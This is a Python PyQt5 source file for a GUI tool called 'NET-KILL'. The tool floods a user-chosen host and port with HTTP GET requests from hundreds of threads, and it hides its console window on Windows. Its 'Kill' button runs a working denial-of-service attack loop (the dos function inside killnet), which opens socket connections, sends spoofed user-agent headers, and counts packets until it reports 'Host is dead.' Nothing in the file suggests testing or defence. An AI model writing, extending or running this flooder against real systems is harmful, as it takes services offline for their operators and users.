# -*- coding: utf-8 -*-

# Form implementation generated from reading ui file 'form.ui'
#
# Created by: PyQt5 UI code generator 5.15.9
#
# WARNING: Any manual changes made to this file will be lost when pyuic5 is
# run again.  Do not edit this file unless you know what you are doing.


from PyQt5 import QtCore, QtGui, QtWidgets
from PyQt5.QtCore import Qt, QPoint
import sys, res, os
from PyQt5.QtWidgets import QLineEdit

from src import Greedy_ddos as ddos
from src import check_port
import random, threading, socket
class Ui_Form(object):

    def setupUi(self, Form):
        Form.setObjectName("Form")
        Form.resize(450, 550)
        Form.setWindowFlags(QtCore.Qt.FramelessWindowHint)
        Form.setAttribute(QtCore.Qt.WA_TranslucentBackground)
        self.widget = QtWidgets.QWidget(Form)
        self.widget.setGeometry(QtCore.QRect(50, 50, 370, 480))

        self.widget.setStyleSheet("QPushButton#pushButton{\n"
"    background-color: qlineargradient(spread:pad, x1:0, y1:0, x2:1, y2:1, stop:0 rgba(255, 0, 0, 210), stop:1 rgba(40, 0, 0, 210));\n"
"    ;\n"
"    \n"
"    \n"
"    \n"
"    color: rgb(0, 0, 0);\n"
"    border-radius: 15px;\n"
"}\n"
"QPushButton#pushButton:hover{\n"
"    background-color: qlineargradient(spread:pad, x1:0, y1:0, x2:1, y2:1, stop:0 rgba(255, 0, 0, 210), stop:1 rgba(40, 0, 0, 210));\n"
"    ;\n"
"    \n"
"    \n"
"    \n"
"    color: rgb(0, 0, 0);\n"
"    border-radius: 20px;\n"
"}\n"
"QPushButton#pushButton:pressed{\n"
"    background-color: qlineargradient(spread:pad, x1:0, y1:0, x2:1, y2:1, stop:0 rgba(255, 0, 0, 210), stop:1 rgba(40, 0, 0, 210));\n"
"    ;\n"
"    \n"
"    \n"
"    \n"
"    color: rgb(0, 0, 0);\n"
"    border-radius: 20px;\n"
"}")
        self.widget.setObjectName("widget")
        self.label = QtWidgets.QLabel(self.widget)
        self.label.setGeometry(QtCore.QRect(40, 30, 300, 420))
        self.label.setStyleSheet("border-image: url(:/images/images/background.jpg);\n"
"border-image: url(:/images/images/background.png);\n"
"border-radius:20px;")
        self.label.setObjectName("label")
        self.label_2 = QtWidgets.QLabel(self.widget)
        self.label_2.setGeometry(QtCore.QRect(40, 30, 300, 420))
        self.label_2.setStyleSheet("border-radius:20px;\n"
"background-color: qlineargradient(spread:pad, x1:0, y1:0, x2:1, y2:1, stop:0 rgba(0, 0, 0, 153), stop:1 rgba(0, 0, 0, 128));")
        self.label_2.setObjectName("label_2")
        self.label_3 = QtWidgets.QLabel(self.widget)
        self.label_3.setGeometry(QtCore.QRect(50, 60, 280, 390))
        self.label_3.setObjectName("label_3")
        self.lineEdit = QtWidgets.QLineEdit(self.widget)
        self.lineEdit.setGeometry(QtCore.QRect(80, 120, 200, 40))
        self.lineEdit.setStatusTip("")
        self.lineEdit.setStyleSheet("background-color:rgba(0,0,0,0);\n"
"border:none;\n"
"border-bottom: 2px solid rgba(255, 0, 0, 255);\n"
"color: rgb(255, 0, 0);\n"
"pedding-bottom:11px;")
        self.lineEdit.setInputMask("")
        self.lineEdit.setObjectName("lineEdit")
        self.lineEdit_2 = QtWidgets.QLineEdit(self.widget)
        self.lineEdit_2.setGeometry(QtCore.QRect(80, 180, 200, 40))
        self.lineEdit_2.setStyleSheet("background-color:rgba(0,0,0,0);\n"
"border:none;\n"
"border-bottom: 2px solid rgba(255, 0, 0, 255);\n"
"color: rgb(255, 0, 0);\n"
"pedding-bottom:11px;")
        self.lineEdit_2.setInputMask("")
        self.lineEdit_2.setObjectName("lineEdit_2")
        self.pushButton = QtWidgets.QPushButton(self.widget)
        self.pushButton.setGeometry(QtCore.QRect(80, 310, 200, 40))
        font = QtGui.QFont()
        font.setPointSize(12)
        font.setBold(True)
        font.setWeight(75)
        self.pushButton.setFont(font)
        self.pushButton.setObjectName("pushButton")
        self.label_4 = QtWidgets.QLabel(self.widget)
        self.label_4.setGeometry(QtCore.QRect(150, 410, 111, 41))
        self.label_4.setStyleSheet("color: rgb(255, 255, 255);\n"
"color: rgb(170, 0, 0);")
        self.label_4.setObjectName("label_4")
        self.label_5 = QtWidgets.QLabel(self.widget)
        self.label_5.setGeometry(QtCore.QRect(140, 70, 111, 51))
        font = QtGui.QFont()
        font.setPointSize(15)
        font.setBold(True)
        font.setItalic(True)
        font.setUnderline(False)
        font.setWeight(75)
        font.setStrikeOut(False)
        font.setKerning(True)
        font.setStyleStrategy(QtGui.QFont.NoAntialias)
        self.label_5.setFont(font)
        self.label_5.setToolTip("")
        self.label_5.setStyleSheet("color: rgb(255, 38, 23);")
        self.label_5.setObjectName("label_5")
        self.lineEdit_3 = QtWidgets.QLineEdit(self.widget)
        self.lineEdit_3.setGeometry(QtCore.QRect(80, 230, 81, 40))
        font = QtGui.QFont()
        font.setBold(False)
        font.setWeight(50)
        self.lineEdit_3.setFont(font)
        self.lineEdit_3.setStyleSheet("background-color:rgba(0,0,0,0);\n"
"border:none;\n"
"border-bottom: 2px solid rgba(255, 0, 0, 255);\n"
"color: rgb(255, 0, 0);\n"
"pedding-bottom:11px;")
        self.lineEdit_3.setInputMask("")
        self.lineEdit_3.setObjectName("lineEdit_3")
        self.label_6 = QtWidgets.QLabel(self.widget)
        self.label_6.setGeometry(QtCore.QRect(130, 270, 111, 41))
        self.label_6.setToolTip("")
        self.label_6.setLayoutDirection(QtCore.Qt.LeftToRight)
        self.label_6.setStyleSheet("color: rgb(255, 255, 255);\n"
"color: rgb(170, 0, 0);")
        self.label_6.setTextFormat(QtCore.Qt.AutoText)
        self.label_6.setScaledContents(True)
        self.label_6.setAlignment(QtCore.Qt.AlignCenter)
        self.label_6.setWordWrap(False)
        self.label_6.setObjectName("label_6")

        self.retranslateUi(Form)
        QtCore.QMetaObject.connectSlotsByName(Form)

    def retranslateUi(self, Form):
        _translate = QtCore.QCoreApplication.translate
        Form.setWindowTitle(_translate("Form", "Form"))
        self.label.setText(_translate("Form", ""))
        self.label_2.setText(_translate("Form", ""))
        self.label_3.setText(_translate("Form", ""))
        self.lineEdit.setPlaceholderText(_translate("Form", "Host"))
        self.lineEdit_2.setPlaceholderText(_translate("Form", "Port"))
        self.pushButton.setText(_translate("Form", "Kill"))
        self.label_4.setText(_translate("Form", "By: greedalbadi"))
        self.label_5.setText(_translate("Form", "NET-KILL"))
        self.lineEdit_3.setText(_translate("Form", "300"))
        self.lineEdit_3.setPlaceholderText(_translate("Form", "Threads"))
        self.label_6.setText(_translate("Form", "sleeping."))


        self.pushButton.clicked.connect(self.load_killnet)


class Form(QtWidgets.QWidget, Ui_Form, ddos):
    def __init__(self, *args, **kwargs):
        QtWidgets.QWidget.__init__(self, *args, **kwargs)

        self.setupUi(self)
        self.setWindowTitle("NET KILL")
        self.packetc = 0
        self.running_threads = 0
        self.running = False

    def load_killnet(self):
        self.label_6.setText(f"Loading Kill-net.")
        if self.running == False:
            if self.lineEdit.text() == "" or self.lineEdit.text() == "" == 0 or self.lineEdit.text() == "":
                self.label_6.setText("Somthing is missing")

            elif check_port(self.lineEdit.text(), self.lineEdit_2.text()) == False:

                self.label_6.setText("Host\\port isn't active")

            else:
                self.running = True
                self.killnet()

        else:

            self.running = False
            self.label_6.setText("stopping...")
            self.pushButton.setText("stopping..")
            while True:

                if self.running_threads == 0:

                    self.label_6.setText("sleeping.")
                    self.pushButton.setText("Kill")
                    self.packetc = 0
                    break



    def center(self):
        qr = self.frameGeometry()
        cp = QtWidgets.QDesktopWidget().availableGeometry().center()
        qr.moveCenter(cp)
        self.move(qr.topLeft())


    def mousePressEvent(self, event):
        self.oldPos = event.globalPos()

    def mouseMoveEvent(self, event):
        delta = QPoint(event.globalPos() - self.oldPos)
        self.move(self.x() + delta.x(), self.y() + delta.y())
        self.oldPos = event.globalPos()


    def killnet(self):
        attack = ddos()
        self.label_6.setText(f"Loading user agent.")
        agent = attack.load_agents()
        self.label_6.setText(f"Done.")
        self.label_6.setText(f"Loading headers.")
        headers = attack.load_headers()
        self.label_6.setText(f"Done.")

        def dos(host, port):
            self.running_threads += 1
            while self.running:
                try:
                    packet = str("GET / HTTP/1.1\nHost: " + host + "\n\n User-Agent: " + random.choice(
                        agent) + "\n" + headers).encode('utf-8')
                    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    server.connect((str(host), int(port)))
                    if server.sendto(packet, (str(host), int(port))):
                        self.packetc += 1
                        self.label_6.setText(f"sent {self.packetc}")
                    else:
                        self.label_6.setText(f"Fault sent {self.packetc}.")
                    server.close()
                except socket.error:
                    self.label_6.setText(f"Host is dead.")
            self.running_threads -= 1
        self.label_6.setText(f"getting threads.")
        threads = int(self.lineEdit_3.text())
        self.label_6.setText(f"{threads} Threads starting..")
        for _ in range(threads):
            threading.Thread(target=dos, args=[self.lineEdit.text(), int(self.lineEdit_2.text())]).start()

        self.pushButton.setText("STOP")





if __name__ == "__main__":
    import os

    if os.name == 'nt':
        import win32gui, win32con

        the_program_to_hide = win32gui.GetForegroundWindow()
        win32gui.ShowWindow(the_program_to_hide, win32con.SW_HIDE)
    app = QtWidgets.QApplication(sys.argv)
    w = Form()
    w.show()
    sys.exit(app.exec_())
